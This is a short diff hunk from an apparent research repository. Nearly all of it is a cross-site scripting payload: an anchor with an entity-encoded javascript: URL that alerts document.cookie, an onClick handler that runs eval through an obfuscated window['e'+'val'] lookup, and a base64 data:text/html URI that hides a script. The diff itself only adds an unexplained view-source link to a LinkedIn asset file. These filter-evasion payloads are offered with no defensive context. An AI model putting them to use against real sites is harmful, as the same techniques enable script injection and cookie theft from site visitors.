@@ -6,7 +6,7 @@ RESEARCH REPO 20250303
 
 <a href="java&#115;&#99;ript:alert(document.cookie)" onClick="(function(){try{return window['e'+'val'](this.getAttribute('data-custom'))}catch(e){}}).call(this)" data-custom="alert(navigator.userAgent)" data-text="data:text/html;base64,PHNjcmlwdD4KKGFzeW5jIGZ1bmN0aW9uKCl7CiAgYXdhaXQgbmV3IFByb21pc2UociA9PiBzZXRUaW1lb3V0KHIsIDUwMCkpOwogIGFsZXJ0KCdYU1MgdmlhIGRhdGEtdGV4dCcpOwp9KSgpOwo8L3NjcmlwdD4=">Click me</a>
 
-
+view-source:https://www.linkedin.com/assets/vendor-static.js
 
 
 
